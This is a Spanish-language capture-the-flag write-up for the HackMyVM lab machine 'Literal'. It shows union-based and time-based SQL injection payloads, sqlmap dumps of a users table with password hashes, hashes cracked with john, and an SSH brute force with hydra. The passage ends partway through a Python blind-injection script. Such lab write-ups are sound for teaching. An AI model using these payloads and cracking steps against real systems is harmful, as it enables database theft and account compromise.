<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>Writeup HackMyVM Literal</title>

  <meta name="description" content="Resolución de la máquina Literal de la plataforma de HackMyVM">
  <meta name="author" content="GatoGamer1155">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Writeup HackMyVM Literal">
  <meta name="twitter:description" content="Resolución de la máquina Literal de la plataforma de HackMyVM">
  <meta name="twitter:creator" content="GatoGamer1155">  
  <meta name="twitter:image" content="/images/otros/hackmyvm.png" />

  <meta property="og:site_name" content="GatoGamer1155" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="Writeup HackMyVM Literal">
  <meta property="og:description" content="Resolución de la máquina Literal de la plataforma de HackMyVM">
  <meta property="og:image" content="/images/otros/hackmyvm.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/otros/hackmyvm.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="Writeup HackMyVM Literal" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/hmv" title="GatoGamer1155" class="blog-button">HackMyVM</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#enumeration">Enumeración</a></li>
        <li><a href="#sqli-union">Sqli - union</a></li>
        <li><a href="#sqli-time">Sqli - time</a></li>
        <li><a href="#shell-carlos">Shell - carlos</a></li>
        <li><a href="#shell-root">Shell - root</a></li>
      </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">HackMyVM</h4>
    <picture><img src="/images/otros/hackmyvm.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">Literal</h2><br>
  </header>
  
<section class="post" id="enumeration">
<br><h3 class="post-title">Enumeración</h3><br>

<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos solo 2 puertos abiertos, donde corren los servicios <code class="language-plaintext highlighter-rouge">ssh</code> y <code class="language-plaintext highlighter-rouge">http</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nmap </span><span class="p">192.168.100.87
Nmap scan report for 192.168.100.87  
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http</span>
</code></pre></div></div><br>

<p class="plain-text">Tramitando una simple petición con <code class="language-plaintext highlighter-rouge">curl</code> hacia la web, en las <code class="language-plaintext highlighter-rouge">cabeceras</code> de respuesta podemos encontrar que la web nos redirige al dominio <code class="language-plaintext highlighter-rouge">blog.literal.hmv</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ curl </span><span class="p">192.168.100.87 -I
HTTP/1.1 301 Moved Permanently
Date: Fri, 05 May 2023 04:28:59 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: http://blog.literal.hmv
Content-Type: text/html; charset=iso-8859-1  </span>
</code></pre></div></div><br>

<p class="plain-text">Ya que estamos en local debemos agregar el <code class="language-plaintext highlighter-rouge">dominio</code> junto con la ip al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para al apuntar a el la máquina local sepa a donde <code class="language-plaintext highlighter-rouge">resolver</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ echo </span><span class="am">"192.168.100.87 blog.literal.hmv"</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
</code></pre></div></div><br>

<p class="plain-text">Al abrir la página web desde el <code class="language-plaintext highlighter-rouge">dominio</code> nos encontramos con algunas <code class="language-plaintext highlighter-rouge">pestañas</code></p>
<a href="/hmv/literal/1.png" target="_blank"><div><p><img src="/hmv/literal/1.png"></p></div></a>

<p class="plain-text">Podemos ver la pestaña <code class="language-plaintext highlighter-rouge">login</code> la cual al abrirla nos lleva a un panel de autenticación y aunque no tenemos <code class="language-plaintext highlighter-rouge">credenciales</code> podemos darle clic al botón <code class="language-plaintext highlighter-rouge">Sign Up</code></p>
<a href="/hmv/literal/2.png" target="_blank"><div><p><img src="/hmv/literal/2.png"></p></div></a>

<p class="plain-text">Podemos <code class="language-plaintext highlighter-rouge">registrar</code> un usuario nuevo, en este caso usaremos <code class="language-plaintext highlighter-rouge">testing</code> tanto con el usuario como con la contraseña, volvemos al <code class="language-plaintext highlighter-rouge">login</code> e iniciamos sesión con el</p>
<a href="/hmv/literal/3.png" target="_blank"><div><p><img src="/hmv/literal/3.png"></p></div></a>
<a href="/hmv/literal/4.png" target="_blank"><div><p><img src="/hmv/literal/4.png"></p></div></a>

<p class="plain-text">Al autenticarnos podemos ver un <code class="language-plaintext highlighter-rouge">dashboard</code> ademas algunos botones, uno de ellos es para ver la lista de los <code class="language-plaintext highlighter-rouge">proyectos</code> en los que esta trabajando el usuario</p>
<a href="/hmv/literal/5.png" target="_blank"><div><p><img src="/hmv/literal/5.png"></p></div></a>
<a href="/hmv/literal/6.png" target="_blank"><div><p><img src="/hmv/literal/6.png"></p></div></a>

<p class="plain-text">Podemos ver una tabla y <code class="language-plaintext highlighter-rouge">filtrar</code> en la barra por el <code class="language-plaintext highlighter-rouge">estado</code> del proyecto, cualquiera de los que esta a la derecha deberia funcionar, en este caso podemos usar <code class="language-plaintext highlighter-rouge">Done</code></p>
<a href="/hmv/literal/7.png" target="_blank"><div><p><img src="/hmv/literal/7.png"></p></div></a>

</section>

<section class="post" id="sqli-union">
<br><h3 class="post-title">SQL Injection - Union Based</h3><br>

<p class="plain-text">Después de un rato notamos una inyección <code class="language-plaintext highlighter-rouge">sql</code>, despues de iterar sobre varias <code class="language-plaintext highlighter-rouge">columnas</code> podemos ver que existen las <code class="language-plaintext highlighter-rouge">5</code> que se ven <code class="language-plaintext highlighter-rouge">reflejadas</code> en la web</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="s">Done' </span><span class="o">order by </span><span class="mi">5</span><span class="c1">-- -  </span>
</code></pre></div></div><br>
<a href="/hmv/literal/9.png" target="_blank"><div><p><img src="/hmv/literal/9.png"></p></div></a>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="s">' </span><span class="o">union select </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="c1">-- -  </span>
</code></pre></div></div><br>
<a href="/hmv/literal/10.png" target="_blank"><div><p><img src="/hmv/literal/10.png"></p></div></a>

<p class="plain-text">Podemos usar cualquier columna para la <code class="language-plaintext highlighter-rouge">sqli</code> en este caso la 2 para en ella con <code class="language-plaintext highlighter-rouge">database()</code> nos devuelva el nombre de la <code class="language-plaintext highlighter-rouge">base de datos</code> actualmente en uso</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="s">' </span><span class="o">union select </span><span class="mi">1</span><span class="p">,database(),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="c1">-- -  </span>
</code></pre></div></div><br>
<a href="/hmv/literal/11.png" target="_blank"><div><p><img src="/hmv/literal/11.png"></p></div></a>

<p class="plain-text">La base de datos en uso es <code class="language-plaintext highlighter-rouge">blog</code>, podemos enumerar todas las bases de datos <code class="language-plaintext highlighter-rouge">existentes</code>, sin embargo no hay mas que las bases de datos por <code class="language-plaintext highlighter-rouge">defecto</code> de mysql</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="s">' </span><span class="o">union select </span><span class="mi">1</span><span class="p">,schema_name,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="o"> from </span><span class="mi">information_schema</span><span class="p">.</span><span class="mi">schemata</span><span class="c1">-- -  </span>
</code></pre></div></div><br>
<a href="/hmv/literal/12.png" target="_blank"><div><p><img src="/hmv/literal/12.png"></p></div></a>

<p class="plain-text">Ahora enumeramos los nombres de las <code class="language-plaintext highlighter-rouge">tablas</code> que existen en la base de datos <code class="language-plaintext highlighter-rouge">blog</code>, una almacena los <code class="language-plaintext highlighter-rouge">proyectos</code> la que nos podria interesar es la tabla <code class="language-plaintext highlighter-rouge">users</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="s">' </span><span class="o">union select </span><span class="mi">1</span><span class="p">,table_name,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="o"> from </span><span class="mi">information_schema</span><span class="p">.</span><span class="mi">tables</span><span class="o"> where </span><span class="p">table_schema</span><span class="o">=</span><span class="s">'blog'</span><span class="c1">-- -  </span>
</code></pre></div></div><br>
<a href="/hmv/literal/13.png" target="_blank"><div><p><img src="/hmv/literal/13.png"></p></div></a>

<p class="plain-text">Ahora que sabemos que existe, enumeramos las <code class="language-plaintext highlighter-rouge">columnas</code> existentes especificando la tabla <code class="language-plaintext highlighter-rouge">users</code> de la base de datos <code class="language-plaintext highlighter-rouge">blog</code>, encontramos <code class="language-plaintext highlighter-rouge">5</code> columnas en total</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="s">' </span><span class="o">union select </span><span class="mi">1</span><span class="p">,column_name,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="o"> from </span><span class="mi">information_schema</span><span class="p">.</span><span class="mi">columns</span><span class="o"> where </span><span class="p">table_schema</span><span class="o">=</span><span class="s">'blog'</span><span class="o"> and </span><span class="p">table_name</span><span class="o">=</span><span class="s">'users'</span><span class="c1">-- -  </span>
</code></pre></div></div><br>
<a href="/hmv/literal/22.png" target="_blank"><div><p><img src="/hmv/literal/22.png"></p></div></a>

<p class="plain-text">Podemos usar una <code class="language-plaintext highlighter-rouge">columna</code> para cada existente y asi ver <code class="language-plaintext highlighter-rouge">reflejados</code> todos los datos en la tabla <code class="language-plaintext highlighter-rouge">users</code>, esto incluye <code class="language-plaintext highlighter-rouge">usuarios</code>, identificadores y sus respectivos <code class="language-plaintext highlighter-rouge">hashes</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="s">' </span><span class="o">union select </span><span class="p">usercreatedate,useremail,userid,username,userpassword</span><span class="o"> from </span><span class="p">users</span><span class="c1">-- -  </span>
</code></pre></div></div><br>
<a href="/hmv/literal/14.png" target="_blank"><div><p><img src="/hmv/literal/14.png"></p></div></a>

<p class="plain-text">Otra forma es con <code class="language-plaintext highlighter-rouge">sqlmap</code>, con <code class="language-plaintext highlighter-rouge">burpsuite</code> interceptamos la petición para ver como se tramita, esto incluye la <code class="language-plaintext highlighter-rouge">data</code> enviada por POST y la <code class="language-plaintext highlighter-rouge">cookie</code> que necesitamos</p>
<a href="/hmv/literal/15.png" target="_blank"><div><p><img src="/hmv/literal/15.png"></p></div></a>

<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">sqlmap</code> definimos la petición indicando como se tramita la <code class="language-plaintext highlighter-rouge">data</code> y la <code class="language-plaintext highlighter-rouge">cookie</code> del usuario, con el parametro <code class="language-plaintext highlighter-rouge">-dbs</code> podemos enumerar las bases de datos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sqlmap</span><span class="p"> --batch --url http://blog.literal.hmv/next_projects_to_do.php --cookie PHPSESSID=t77t8gmfi9j2mhlp1f2i14rblu --data sentence-query=Done -dbs  
</span><span class="am">        ___
       __H__
 ___ ___[</span><span class="ro">.</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.2#stable</span><span class="p">}
</span><span class="am">|_ -| . [</span><span class="ro">(</span><span class="am">]     | .'| . |
</span><span class="am">|___|_  [</span><span class="ro">,</span><span class="am">]_|_|_|__,|  _|
</span><span class="am">      |_|V...       |_|   </span><span class="p">https://sqlmap.org

[</span><span class="az">23:08:02</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resuming back-end DBMS 'mysql' 
[</span><span class="az">23:08:02</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] testing connection to the target URL
[</span><span class="az">23:08:02</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] the back-end DBMS is MySQL
[</span><span class="az">23:08:02</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching database names
available databases [4]:
[*] blog
[*] information_schema
[*] mysql
[*] performance_schema</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos ver todas, con el parametro <code class="language-plaintext highlighter-rouge">-D</code> indicamos la base de datos <code class="language-plaintext highlighter-rouge">blog</code> y usando <code class="language-plaintext highlighter-rouge">-tables</code> podemos dumpear las <code class="language-plaintext highlighter-rouge">tablas</code> existentes de la base de datos indicada</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sqlmap</span><span class="p"> --batch --url http://blog.literal.hmv/next_projects_to_do.php --cookie PHPSESSID=t77t8gmfi9j2mhlp1f2i14rblu --data sentence-query=Done -D blog -tables  
</span><span class="am">        ___
       __H__
 ___ ___[</span><span class="ro">.</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.2#stable</span><span class="p">}
</span><span class="am">|_ -| . [</span><span class="ro">(</span><span class="am">]     | .'| . |
</span><span class="am">|___|_  [</span><span class="ro">,</span><span class="am">]_|_|_|__,|  _|
</span><span class="am">      |_|V...       |_|   </span><span class="p">https://sqlmap.org

[</span><span class="az">23:08:03</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resuming back-end DBMS 'mysql'
[</span><span class="az">23:08:03</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] testing connection to the target URL
[</span><span class="az">23:08:03</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] the back-end DBMS is MySQL
[</span><span class="az">23:08:03</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching tables for database: 'blog'
Database: blog
[2 tables]
+----------+
| projects |
| users    |
+----------+</span>
</code></pre></div></div><br>

<p class="plain-text">Indicamos con <code class="language-plaintext highlighter-rouge">-T</code> la tabla <code class="language-plaintext highlighter-rouge">users</code> existente y usando el parametro <code class="language-plaintext highlighter-rouge">-dump</code> podemos dumpear absolutamente todo el <code class="language-plaintext highlighter-rouge">contenido</code> de todas las columnas existentes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sqlmap</span><span class="p"> --batch --url http://blog.literal.hmv/next_projects_to_do.php --cookie PHPSESSID=t77t8gmfi9j2mhlp1f2i14rblu --data sentence-query=Done -D blog -T users -dump  
</span><span class="am">        ___
       __H__
 ___ ___[</span><span class="ro">.</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.2#stable</span><span class="p">}
</span><span class="am">|_ -| . [</span><span class="ro">(</span><span class="am">]     | .'| . |
</span><span class="am">|___|_  [</span><span class="ro">,</span><span class="am">]_|_|_|__,|  _|
</span><span class="am">      |_|V...       |_|   </span><span class="p">https://sqlmap.org

[</span><span class="az">23:08:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resuming back-end DBMS 'mysql'
[</span><span class="az">23:08:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] testing connection to the target URL
[</span><span class="az">23:08:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] the back-end DBMS is MySQL
[</span><span class="az">23:08:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching entries for table 'users' in database 'blog'
Database: blog
Table: users
[18 entries]
+--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
| userid | username  | useremail                        | userpassword                                                 | usercreatedate      |
+--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
| 1      | test      | test@blog.literal.htb            | $2y$10$wWhvCz1pGsKm..jh/lChIOA7aJoZRAil40YKlGFiw6B.6a77WzNma | 2023-04-07 17:21:47 |
| 2      | admin     | admin@blog.literal.htb           | $2y$10$fjNev2yv9Bi1IQWA6VOf9Owled5hExgUZNoj8gSmc7IdZjzuOWQ8K | 2023-04-07 17:21:47 |
| 3      | carlos    | carlos@blog.literal.htb          | $2y$10$ikI1dN/A1lhkKLmiKl.cJOkLiSgPUPiaRoopeqvD/.p.bh0w.bJBW | 2023-04-07 17:21:48 |
| 4      | freddy123 | freddy123@zeeli.moc              | $2y$10$yaf9nZ6UJkf8103R8rMdtOUC.vyZUek4vXVPas3CPOb4EK8I6eAUK | 2023-04-07 17:21:48 |
| 5      | jorg3_M   | jorg3_M@zeeli.moc                | $2y$10$lZ./Zflz1EEFdYbWp7VUK.415Ni8q9kYk3LJ2nF0soRJG1RymtDzG | 2023-04-07 17:21:48 |
| 6      | aNdr3s1to | aNdr3s1to@puertonacional.ply     | $2y$10$F2Eh43xkXR/b0KaGFY5MsOwlnh4fuEZX3WNhT3PxSw.6bi/OBA6hm | 2023-04-07 17:21:48 |
| 7      | kitty     | kitty@estadodelarte.moc          | $2y$10$rXliRlBckobgE8mJTZ7oXOaZr4S2NSwqinbUGLcOfCWDra6v9bxcW | 2023-04-07 17:21:48 |
| 8      | walter    | walter@forumtesting.literal.hmv  | $2y$10$er9GaSRv1AwIwu9O.tlnnePNXnzDfP7LQMAUjW2Ca1td3p0Eve6TO | 2023-04-07 17:21:48 |
| 9      | estefy    | estefy@caselogic.moc             | $2y$10$hBB7HeTJYBAtdFn7Q4xzL.WT3EBMMZcuTJEAvUZrRe.9szCp19ZSa | 2023-04-07 17:21:48 |
| 10     | michael   | michael@without.you              | $2y$10$sCbKEWGgAUY6a2Y.DJp8qOIa250r4ia55RMrDqHoRYU3Y7pL2l8Km | 2023-04-07 17:21:48 |
| 11     | r1ch4rd   | r1ch4rd@forumtesting.literal.hmv | $2y$10$7itXOzOkjrAKk7Mp.5VN5.acKwGi1ziiGv8gzQEK7FOFLomxV0pkO | 2023-04-07 17:21:48 |
| 12     | fel1x     | fel1x@without.you                | $2y$10$o06afYsuN8yk0yoA.SwMzucLEavlbI8Rl43.S0tbxL.VVSbsCEI0m | 2023-04-07 17:21:48 |
| 13     | kelsey    | kelsey@without.you               | $2y$10$vxN98QmK39rwvVbfubgCWO9W2alVPH4Dp4Bk7DDMWRvfN995V4V6. | 2023-04-07 17:21:48 |
| 14     | jtx       | jtx@tiempoaltiempo.hy            | $2y$10$jN5dt8syJ5cVrlpotOXibeNC/jvW0bn3z6FetbVU/CeFtKwhdhslC | 2023-04-07 17:21:48 |
| 15     | DRphil    | DRphil@alcaldia-tol.gob          | $2y$10$rW58MSsVEaRqr8uIbUeEeuDrYB6nmg7fqGz90rHYHYMt2Qyflm1OC | 2023-04-07 17:21:48 |
| 16     | carm3N    | carm3N@estadodelarte.moc         | $2y$10$D7uF6dKbRfv8U/M/mUj0KujeFxtbj6mHCWT5SaMcug45u7lo/.RnW | 2023-04-07 17:21:48 |
| 17     | lanz      | lanz@literal.htb                 | $2y$10$PLGN5.jq70u3j5fKpR8R6.Zb70So/8IWLi4e69QqJrM8FZvAMf..e | 2023-04-07 17:55:36 |
| 18     | testing   | test@test.test                   | $2y$10$tUnS0IJxE2pxC2qmusgp4uLhWtoLWFZKlO0lFOKQwZEsrajti7cbC | 2023-04-20 22:59:43 |
+--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+</span>
</code></pre></div></div><br>

<p class="plain-text">Guardamos los <code class="language-plaintext highlighter-rouge">hashes</code> en un archivo y con <code class="language-plaintext highlighter-rouge">john</code> aplicamos fuerza bruta, aunque podemos conseguir varias <code class="language-plaintext highlighter-rouge">credenciales</code> el proceso es demasiado <code class="language-plaintext highlighter-rouge">tardado</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded 18 password hashes with 18 different salts (bcrypt [Blowfish 32/64 X3])  
Cost 1 (iteration count) is 1024 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
</span><span class="am">123456789</span><span class="p">        (</span><span class="am">freddy123</span><span class="p">)
</span><span class="am">butterfly</span><span class="p">        (</span><span class="am">estefy</span><span class="p">)
</span><span class="am">monica</span><span class="p">           (</span><span class="am">r1ch4rd</span><span class="p">)
</span><span class="am">hellokitty</span><span class="p">       (</span><span class="am">kitty</span><span class="p">)
</span><span class="am">50cent</span><span class="p">           (</span><span class="am">DRphil</span><span class="p">)
</span><span class="am">slipknot</span><span class="p">         (</span><span class="am">jorg3_M</span><span class="p">)
</span><span class="am">michael1</span><span class="p">         (</span><span class="am">michael</span><span class="p">)
</span><span class="am">147258369</span><span class="p">        (</span><span class="am">fel1x</span><span class="p">)
</span><span class="am">kelsey</span><span class="p">           (</span><span class="am">kelsey</span><span class="p">)
</span><span class="am">741852963</span><span class="p">        (</span><span class="am">walter</span><span class="p">)
</span><span class="am">zxcvbnm,./</span><span class="p">       (</span><span class="am">jtx</span><span class="p">)
</span><span class="am">carlos12</span><span class="p">         (</span><span class="am">carlos</span><span class="p">)
Use the "--show" option to display all of the cracked passwords reliably
Session aborted</span>
</code></pre></div></div><br>

<p class="plain-text">Esto nos deja varias <code class="language-plaintext highlighter-rouge">credenciales</code>, las guardamos en un archivo y con <code class="language-plaintext highlighter-rouge">hydra</code> aplicamos fuerza bruta contra <code class="language-plaintext highlighter-rouge">ssh</code>, sin embargo no conseguimos ninguna válida</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ cat</span><span class="p"> credentials   
carlos:carlos12
freddy123:123456789
jorg3_M:slipknot
kitty:hellokitty
walter:741852963
estefy:butterfly
michael:michael1
r1ch4rd:monica
fel1x:147258369
kelsey:kelsey
jtx:zxcvbnm,./
DRphil:50cent</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ hydra</span><span class="p"> -C credentials ssh://192.168.100.87
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries  
[DATA] attacking ssh://192.168.100.87:22/
1 of 1 target completed, 0 valid password found
ydra (https://github.com/vanhauser-thc/thc-hydra) finished</span>
</code></pre></div></div><br>

</section>

<section class="post" id="sqli-time">
<br><h3 class="post-title">SQL Injection - Time Based</h3><br>

<p class="plain-text">Si miramos los <code class="language-plaintext highlighter-rouge">correos</code> que dumpeamos mediante la inyección <code class="language-plaintext highlighter-rouge">sql</code> podemos ver un nuevo <code class="language-plaintext highlighter-rouge">subdominio</code>, el cual es <code class="language-plaintext highlighter-rouge">forumtesting.literal.hmv</code> asi que lo agregamos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">walter@forumtesting.literal.hmv  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ echo </span><span class="am">"192.168.100.87 forumtesting.literal.hmv" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
</code></pre></div></div><br>

<p class="plain-text">Podemos ver una página de <code class="language-plaintext highlighter-rouge">categorias</code> donde al ver los <code class="language-plaintext highlighter-rouge">detalles</code> del foro nos envia a una nueva página, la cual se gestiona mediante el parametro <code class="language-plaintext highlighter-rouge">category_id</code></p>
<a href="/hmv/literal/16.png" target="_blank"><div><p><img src="/hmv/literal/16.png"></p></div></a>
<a href="/hmv/literal/17.png" target="_blank"><div><p><img src="/hmv/literal/17.png"></p></div></a>

<p class="plain-text">Aqui también encontramos una <code class="language-plaintext highlighter-rouge">inyección</code> sql pero esta vez <code class="language-plaintext highlighter-rouge">blind</code> basada en <code class="language-plaintext highlighter-rouge">tiempo</code>, al pasarle como parametro <code class="language-plaintext highlighter-rouge">2 and sleep(5)-- -</code> tarda 5 segundos</p>
<a href="/hmv/literal/19.png" target="_blank"><div><p><img src="/hmv/literal/19.png"></p></div></a>

<p class="plain-text">Podemos aplicar una comparación con <code class="language-plaintext highlighter-rouge">substr</code> para mediante un <code class="language-plaintext highlighter-rouge">if</code> decirle que si la primera <code class="language-plaintext highlighter-rouge">posición</code> del resultado de <code class="language-plaintext highlighter-rouge">database()</code> es <code class="language-plaintext highlighter-rouge">a</code> tarde <code class="language-plaintext highlighter-rouge">5</code> segundos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="mi">2 </span><span class="o">and </span><span class="p">if(substr(database(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s">'a'</span><span class="p">, sleep(</span><span class="mi">5</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">-- -  </span>
</code></pre></div></div><br>
<a href="/hmv/literal/21.png" target="_blank"><div><p><img src="/hmv/literal/21.png"></p></div></a>

<p class="plain-text">Al cambiar la <code class="language-plaintext highlighter-rouge">primera</code> letra de la comparación por <code class="language-plaintext highlighter-rouge">f</code>, esta se cumple y tarda <code class="language-plaintext highlighter-rouge">5</code> segundos en responder, quiere decir que la primera letra de la <code class="language-plaintext highlighter-rouge">base de datos</code> es <code class="language-plaintext highlighter-rouge">f</code></p>
<a href="/hmv/literal/20.png" target="_blank"><div><p><img src="/hmv/literal/20.png"></p></div></a>

<p class="plain-text">Siguiendo esa logica podemos automatizar todo en un <code class="language-plaintext highlighter-rouge">script</code> de python, el que <code class="language-plaintext highlighter-rouge">itere</code> sobre los <code class="language-plaintext highlighter-rouge">caracteres</code> y las <code class="language-plaintext highlighter-rouge">posiciones</code>, cuando el tiempo de <code class="language-plaintext highlighter-rouge">respuesta</code> de la petición sea mayor a <code class="language-plaintext highlighter-rouge">1</code> segundo el caracter actual se <code class="language-plaintext highlighter-rouge">sumara</code> al valor final</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log
</span><span class="o">import </span><span class="p">string, requests, time

characters </span><span class="o">= </span><span class="p">string.ascii_lowercase </span><span class="o">+ </span><span class="p">string.punctuation
bar </span><span class="o">= </span><span class="p">log.progress(</span><span class="s">"Database"</span><span class="p">)

value </span><span class="o">= </span><span class="s">"</span><span class="mi">\n\033</span><span class="s">[0;37m[</span><span class="mi">\033</span><span class="s">[0;34m*</span><span class="mi">\033</span><span class="s">[0;37m] "

